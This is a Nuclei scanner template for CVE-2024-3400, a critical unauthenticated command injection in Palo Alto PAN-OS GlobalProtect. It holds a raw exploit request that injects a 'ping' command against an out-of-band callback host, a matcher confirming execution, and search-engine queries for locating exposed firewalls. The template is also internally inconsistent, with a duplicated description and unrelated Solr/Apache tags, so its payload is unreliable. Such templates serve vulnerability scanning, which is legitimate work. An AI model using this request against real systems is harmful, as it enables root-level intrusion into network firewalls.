id: CVE-2024-3400

info:
  name: GlobalProtect RCE
  author: momika233
  severity: critical
  description: |
    A command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0 and PAN-OS 11.1 firewall configurations with both a GlobalProtect gateway and device telemetry enabled.
  reference:
    - https://unit42.paloaltonetworks.com/cve-2024-3400/
    - https://github.com/momika233/CVE-2024-3400
    - https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/
  description: |
    GlobalProtect RCE
  metadata:
    fofa-query: fofa:icon_hash="602431586"
    ZoomEye-query: app:"Palo Alto Networks firewall httpd"
  tags: solr,apache,rce,oast

requests:
- raw:
    - |
      POST /api/ HTTP/1.1
      Host: {{Hostname}}
      User-Agent: PAN-OS-Exploit
      Content-Type: application/xml

      <?xml version="1.0" encoding="UTF-8"?>
      <request>
        <op cmd="test" />
        <cmd code="ping">{{interactsh-url}}</cmd>
        </request>

  matchers-condition: and
  matchers:
    - type: word
      part: interactsh_protocol
      words:
        - "http"